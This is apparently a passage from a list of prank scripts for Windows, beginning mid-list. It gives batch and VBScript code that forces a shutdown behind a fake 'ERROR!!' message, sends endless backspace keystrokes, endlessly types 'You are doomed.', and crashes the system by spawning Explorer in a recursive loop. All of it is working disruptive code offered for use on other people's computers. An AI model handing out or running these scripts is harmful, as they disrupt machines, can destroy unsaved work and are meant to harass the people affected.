@echo off
shutdown -c “ERROR!!” -s    

2. Backspace Deleter:

MsgBox "Let's go back a few steps"
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop

3. Infinite Typer:

Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "You are doomed."
loop

4. Sytem Crasher:

@echo off
:repeat
Explorer
call loop.bat 
Goto repeat